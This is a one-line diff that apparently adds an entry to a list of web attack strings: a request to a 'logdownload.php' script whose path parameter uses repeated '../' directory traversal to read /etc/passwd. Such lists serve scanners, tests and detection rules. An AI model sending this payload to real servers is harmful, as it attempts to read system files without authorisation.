@@ -1,0 +1,1 @@
+/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd
